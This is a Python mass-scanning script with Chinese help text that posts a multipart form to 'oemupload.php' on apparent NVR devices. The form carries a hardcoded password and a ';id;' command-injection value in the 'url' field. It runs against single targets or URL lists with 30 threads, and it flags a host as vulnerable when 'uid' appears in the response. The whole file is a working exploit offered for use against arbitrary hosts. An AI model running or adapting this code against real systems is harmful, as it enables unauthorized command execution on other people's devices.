import argparse
import textwrap
import warnings
from multiprocessing.dummy import Pool
import requests
import urllib3




def main():
    urllib3.disable_warnings()
    warnings.filterwarnings("ignore")
    parser = argparse.ArgumentParser(description="一个代码执行工具",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''示例：python 1111.py -u www.baidu.com / -f url.txt'''))
    parser.add_argument("-u", "--url", dest="url", help="请输入要检测的url地址")
    parser.add_argument("-f", "--file", dest="file", help="请输入要批量检测的文件")
    args = parser.parse_args()
    urls = []
    if args.url:
        if "http" not in args.url:
            args.url = f"http://{args.url}"
        check(args.url)
    elif args.file:
        with open(f"{args.file}", "r") as f:
            for i in f:
                u = i.strip()
                if "http" not in u:
                    u = f"http://{u}"
                    urls.append(u)
                else:
                    urls.append(u)
    pool = Pool(30)
    pool.map(check, urls)


def check(url):
    u = f"{url}/oemupload.php"
    data = '''------WebKitFormBoundaryYrqVrkjRl2AHEKXG
Content-Disposition: form-data; name="pwd"

nvrmini2260
------WebKitFormBoundaryYrqVrkjRl2AHEKXG
Content-Disposition: form-data; name="url"

;id;
------WebKitFormBoundaryYrqVrkjRl2AHEKXG
Content-Disposition: form-data; name="file"; filename="33.php"
Content-Type: audio/mp3

1
------WebKitFormBoundaryYrqVrkjRl2AHEKXG--'''
    headers = {
        'User-Agent': 'Moziilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryYrqVrkjRl2AHEKXG',
        "Content-Length":'375'
    }
    try:
        a = requests.post(url=u, headers=headers, verify=False,timeout=3,data=data)
        a.encoding = 'utf-8'
        html = a.text
        b = a.status_code
        if b == 200 and "uid" in html:
            print('[+]存在漏洞',u)
        else:
            print('[-]不存在漏洞',u)
    except Exception as i:
        print('[x]请求发生错误',u)


if __name__ == '__main__':
    banner = '''
    $$\                                                                   
$$ |                                                                  
$$$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\  $$$$$$\  $$$$$$$\   $$$$$$\  
$$  __$$\  \____$$\ $$  __$$\ $$ |  $$ |$$  __$$\ $$  __$$\ $$  __$$\ 
$$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  $$ |$$ /  $$ |$$ |  $$ |$$ /  $$ |
$$ |  $$ |$$  __$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |
$$ |  $$ |\$$$$$$$ |\$$$$$$  |\$$$$$$$ |\$$$$$$  |$$ |  $$ |\$$$$$$$ |
\__|  \__| \_______| \______/  \____$$ | \______/ \__|  \__| \____$$ |
                              $$\   $$ |                    $$\   $$ |
                              \$$$$$$  |                    \$$$$$$  |
                               \______/                      \______/ 

    '''
    print(banner)
    main()

